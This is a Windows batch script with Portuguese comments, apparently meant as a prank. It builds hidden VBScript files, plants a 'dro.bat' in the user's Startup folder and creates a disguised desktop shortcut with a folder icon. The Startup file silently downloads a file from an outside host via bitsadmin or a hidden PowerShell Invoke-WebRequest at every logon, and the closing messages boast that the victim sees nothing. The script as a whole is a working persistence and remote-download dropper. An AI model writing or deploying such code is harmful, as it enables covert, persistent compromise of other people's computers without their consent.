@echo off
setlocal

:: Caminhos
set DESKTOP=%USERPROFILE%\Desktop
set LINK="%DESKTOP%\inicia_zoeira.lnk"
set VBS_PATH=%TEMP%\fdp_script.vbs
set SUB_VBS=%TEMP%\fdp_hidden.vbs

:: Criar o VBS de criação do .BAT
> "%SUB_VBS%" echo Set oWS = CreateObject("WScript.Shell")
>> "%SUB_VBS%" echo Set fso = CreateObject("Scripting.FileSystemObject")
>> "%SUB_VBS%" echo startup = oWS.SpecialFolders("Startup")
>> "%SUB_VBS%" echo Set bat = fso.CreateTextFile(startup ^& "\dro.bat", True)
>> "%SUB_VBS%" echo bat.WriteLine "@echo off"
>> "%SUB_VBS%" echo bat.WriteLine "ver | findstr /i ""5\.1"" >nul"
>> "%SUB_VBS%" echo bat.WriteLine "if %%errorlevel%%==0 ("
>> "%SUB_VBS%" echo bat.WriteLine "  bitsadmin /transfer fdp /download /priority foreground https://dro.pm/foda-se foda.jpg"
>> "%SUB_VBS%" echo bat.WriteLine "  move foda.jpg %%USERPROFILE%%\Desktop"
>> "%SUB_VBS%" echo bat.WriteLine ") else ("
>> "%SUB_VBS%" echo bat.WriteLine "  powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://dro.pm/foda-se' -OutFile $env:USERPROFILE\Desktop\foda-se.jpg"""
>> "%SUB_VBS%" echo bat.WriteLine ")"
>> "%SUB_VBS%" echo bat.Close

:: Criar o VBS principal que roda o VBS acima
> "%VBS_PATH%" echo Set oWS = CreateObject("WScript.Shell")
>> "%VBS_PATH%" echo oWS.Run "wscript.exe ""%SUB_VBS%""", 0, False

:: Criar o .LNK que chama o VBS de forma invisível
powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut(%LINK%); $s.TargetPath='wscript.exe'; $s.Arguments='%VBS_PATH%'; $s.IconLocation='shell32.dll,39'; $s.WindowStyle=7; $s.Save()"

echo.
echo 👻 Atalho totalmente invisível criado na Área de Trabalho!
echo Clicou? Ninguém viu. Mas o inferno foi invocado.
pause >nul
